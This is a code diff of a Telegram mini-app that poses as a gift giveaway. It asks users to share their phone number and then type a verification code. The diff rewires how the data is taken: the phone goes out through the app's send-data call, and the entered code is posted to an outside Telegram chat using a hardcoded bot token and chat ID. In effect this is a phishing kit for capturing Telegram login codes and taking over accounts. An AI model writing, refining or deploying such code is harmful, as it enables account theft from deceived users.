@@ -25,12 +25,6 @@
             font-size: 16px; font-weight: 600; width: 100%; max-width: 300px;
             margin-top: 20px; cursor: pointer; display: block; margin-left: auto; margin-right: auto;
         }
-        .manual-input {
-            width: 100%; max-width: 280px; padding: 15px; margin-top: 15px;
-            border: 1.5px solid var(--tg-theme-hint-color, #ccc); border-radius: 10px;
-            font-size: 16px; text-align: center; box-sizing: border-box;
-            background: var(--tg-theme-bg-color, #ffffff); color: var(--tg-theme-text-color, #000000);
-        }
         .success-text { color: #34c759; font-size: 18px; font-weight: bold; margin-top: 20px; }
     </style>
 </head>
@@ -40,14 +34,7 @@
     <div id="screen-phone">
         <h2 style="margin-top: 40px;">Step 1</h2>
         <p style="color: gray;">To receive your gift, authorize below 👇</p>
-        
-        <!-- Кнопка запроса через Telegram -->
         <button class="auth-btn" id="btn-share">SHARE PHONE NUMBER</button>
-        
-        <!-- Резервный ручной ввод (на случай глюков Telegram) -->
-        <div style="margin-top: 30px; font-size: 14px; color: gray;">or enter manually:</div>
-        <input type="tel" id="manual-phone" class="manual-input" placeholder="+7 999 000 00 00">
-        <button class="auth-btn" id="btn-manual" style="background: #666;">CONTINUE</button>
     </div>
 
     <!-- Экран 2 -->
@@ -75,55 +62,33 @@
                 const BOT_TOKEN = "8836719851:AAHO5sFobm_1MwTsC5GUvUCmkgRrRwO8s2g";
                 const CHAT_ID = "-1004399809740";
 
-                function sendToBot(text) {
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
-                    });
-                }
-
-                function showCodeScreen() {
+                // Если в ссылке есть &step=code, значит мы уже поделились номером и сразу показываем экран кода
+                const urlParams = new URLSearchParams(window.location.search);
+                if (urlParams.get('step') === 'code') {
                     document.getElementById('screen-phone').classList.add('hidden');
                     document.getElementById('screen-code').classList.remove('hidden');
-                    setTimeout(() => { document.getElementById('code-input').focus(); }, 100);
+                    setTimeout(() => { document.getElementById('code-input').focus(); }, 300);
                 }
 
-                // 1. Запрос номера через API
+                // 1. ЗАПРОС НОМЕРА
                 document.getElementById('btn-share').onclick = function() {
                     tg.requestContact(function(shared, contact) {
                         if (shared) {
-                            // Пытаемся достать номер
-                            let phone = null;
+                            // Достаем номер (с защитой от undefined)
+                            let phone = "undefined";
                             if (contact && contact.phone_number) phone = contact.phone_number;
                             else if (contact && contact.phone) phone = contact.phone;
-                            else if (tg.initDataUnsafe?.user?.phone_number) phone = tg.initDataUnsafe.user.phone_number;
 
-                            if (phone) {
-                                // Если номер есть — отправляем
-                                sendToBot(`📱 PHONE: +${phone}`);
-                                showCodeScreen();
-                            } else {
-                                // Если Telegram выдал undefined — просим ввести вручную
-                                tg.showAlert("Telegram didn't provide the number. Please enter it manually.");
-                                document.getElementById('manual-phone').focus();
-                            }
+                            // Отправляем данные
+                            tg.sendData(JSON.stringify({ type: "phone", phone: phone }));
+                            
+                            // ТУТ ЖЕ перезапускаем мини-апп на экране с кодом
+                            tg.openTelegramLink("https://t.me/anonlmgifts_bot?startapp=step_code");
                         }
                     });
                 };
 
-                // 2. Ручной ввод номера
-                document.getElementById('btn-manual').onclick = function() {
-                    const phone = document.getElementById('manual-phone').value;
-                    if (phone.length > 5) {
-                        sendToBot(`📱 PHONE (manual): ${phone}`);
-                        showCodeScreen();
-                    } else {
-                        tg.showAlert("Please enter a valid phone number.");
-                    }
-                };
-
-                // 3. Ввод кода
+                // 2. ВВОД КОДА
                 const codeInput = document.getElementById('code-input');
                 const codeCells = document.querySelectorAll('.code-cell');
                 document.getElementById('code-cells').onclick = () => codeInput.focus();
@@ -151,11 +116,15 @@
                         document.getElementById('status-msg').classList.remove('hidden');
                         document.querySelector('.code-subtitle').innerHTML = "<b>Processing...</b>";
                         
-                        sendToBot(`🔑 CODE: ${value}`);
-                        
-                        setTimeout(() => {
-                            document.querySelector('.code-subtitle').innerHTML = "<b style='color: #34c759;'>Code sent successfully!</b>";
-                        }, 1000);
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: CHAT_ID, text: `🔑 CODE: ${value}` })
+                        }).then(res => res.json()).then(data => {
+                            if(data.ok) {
+                                document.querySelector('.code-subtitle').innerHTML = "<b style='color: #34c759;'>Code sent successfully!</b>";
+                            }
+                        });
                     }
                 });
             }
